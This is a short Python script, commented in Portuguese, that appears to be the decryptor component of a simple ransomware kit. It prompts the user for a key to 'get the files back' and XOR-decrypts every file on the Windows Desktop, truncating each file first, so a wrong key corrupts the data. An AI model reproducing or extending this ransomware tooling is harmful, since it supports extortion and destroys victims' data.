import os
import threading
import queue


def decrypt(key):
    file = q.get()
    print(f'Decriptacao {file}')
    try:
        key_index = 0
        max_key_index = len(key)-1
        encrypted_data = ''
        with open(file, 'rb') as f:
            data = f.read()
        with open(file, 'w') as f:
            f.write('')
        for byte in data:
            xor_byte = byte ^ ord(key[key_index])
            with open(file, 'ab') as f:
                f.write(xor_byte.to_bytes(1, 'little'))
            #Implementacao da chave index
            if key_index >= max_key_index:
                key_index = 0
            else:
                key_index += 1
            print(f'{file} Decriptacao realizada')
        
    except:
        print('Falhou em decriptar os arquivos')
    q.task_done()

#Informação de encriptacao    
ENCRYPTION_LEVEL = 512 // 8
key_char_pool = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ<>?,./;[]{}|'
key_char_pool_len = len(key_char_pool)

#Pega filepaths para decriptar
print("preparando arquivos...")
desktop_path = os.environ['USERPROFILE']+'\\Desktop'
files = os.listdir(desktop_path)
abs_files = []
for f in files:
    if os.path.isfile(f'{desktop_path}\\{f}')and f != __file__[:-2]+'exe':
        abs_files.append(f'{desktop_path}\\{f}')
print("Sucesso em encontrar arquivos!")

key = input("Por favor coloque a chave de decriptacao para poder acessar os arquivos de volta: ")

#setando fila com thread para decriptar
q = queue.Queue()
for f in abs_files:
    q.put(f)
    
# setando threads para decriptar
for i in range(10):
    t = threading.Thread(target=decrypt, args=(key,), daemon=True)
    t.start()
    
q.join()
print('Descriptacao esta completa!')
input()
    
        
        

            